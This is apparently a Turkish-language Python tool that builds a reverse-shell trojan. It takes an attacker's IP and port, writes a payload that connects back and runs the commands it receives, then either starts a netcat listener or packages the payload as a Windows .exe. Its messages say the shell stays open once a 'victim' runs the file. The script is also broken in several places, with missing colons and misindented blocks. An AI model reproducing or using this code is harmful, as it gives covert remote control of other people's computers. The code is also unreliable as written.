from colorama import Fore
import os
import socket
import subprocess
import sys
import time


def linux_setup()
 try:
    os.system("sudo pip install pyinstaller -y")
    clear_screen()
    os.system(f"pyinstaller --onefile {filename}")
    clear_screen()
    print("\nDosya .exe uzantılı dosyaya dönüştrüldü. Kullanıcı dosyayı exe olarak açarsa arkada işlem çalışır ve shell devam eder.")
    time.sleep(1)
    clear_screen()
    time.sleep(1)
    print("\n kütüphane kurulmadı ise py dosyanız exe dosyasına cevirilmemis olabilir kendiniz exe yaparsanızv ve \n kurban dosyayı exe olarak acarsa arkada process devam eder ve shell acık kalır")
    
    except Exception as e:
        print("Hata:", str(e))



def windows_setup()
    os.system("pip install pyinstaller")
    clear_screen()
    os.system(f"pyinstaller --onefile {filename}")
    clear_screen()
    print("\nDosya .exe uzantılı dosyaya dönüştrüldü. Kullanıcı dosyayı exe olarak açarsa arkada işlem çalışır ve shell devam eder.")
    time.sleep(1)
    clear_screen()
    time.sleep(1)
    print("\n kütüphane kurulmadı ise py dosyanız exe dosyasına cevirilmemis olabilir kendiniz exe yaparsanızv ve \n kurban dosyayı exe olarak acarsa arkada process devam eder ve shell acık kalır")


def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clear_screen()

banner = ''' 
                                                   __   
 ___.__._____ __  _  ______  ______ ____________ _/  |_ 
<   |  |\__  \\ \/ \/ /  _ \/  ___/ \_  __ \__  \\   __\
 \___  | / __ \\     (  <_> )___ \   |  | \// __ \|  |  
 / ____|(____  /\/\_/ \____/____  >  |__|  (____  /__|  
 \/          \/                 \/              \/      


        discord - yawos  
                            
'''

print(f"{Fore.RED}{banner}{Fore.RESET}")
time.sleep(1.5)
clear_screen()

try:
    ip = input(f"  {Fore.CYAN} [ {Fore.GREEN} ip  {Fore.CYAN} ]  {Fore.YELLOW} > {Fore.RESET} ")
    port = int(input(f"  {Fore.CYAN} [ {Fore.GREEN} port {Fore.CYAN} ] {Fore.YELLOW} > {Fore.RESET} "))

    filename = input(f"\n Dosya adı girin (uzantı olmadan): ")
    filename += ".py"

    code = f'''
import os
import socket
import subprocess
import sys
import time

HOST = "{ip}"
PORT = {port}

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024)
    if data == b"quit":
        s.close()
        sys.exit(0)
    elif len(data) == 0:
        return True
    else:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
        return False

def main():
    while True:
        socket_died = False
        try:
            s = connect(HOST, PORT)
            while not socket_died:
                socket_died = wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    main()
'''

    with open(filename, "w") as file:
        file.write(code)
    print(f"{filename} adında bir Python dosyası oluşturuldu.")
    time.sleep(1.2)

    print("Dosyayı ne yapmak istersiniz?\n")
    islemno = input("1-) Reverse Shell (sadece linux icin gecerli.)\n2-) RAT/TROJAN\n3-) Bir şey yapma ")
    
    if islemno == "1":
        
            print("Shell dinleniyor...")
            os.system("sudo apt-get install rlwrap -y")
            os.system("sudo apt-get install netcat -y")
            clear_screen()
            os.system(f"rlwrap nc -nlvp {port}")
    
    elif islemno == "2":
       if os.name == "nt":
        windows_setup()
    else:
        linux_setup()

    elif islemno == "3":
        clear_screen()
        print("dosyan hazır :DD")
except ValueError:
    print("Hata: Lütfen geçerli bir sayı girin.")
except Exception as e:
    print("Hata:", str(e))
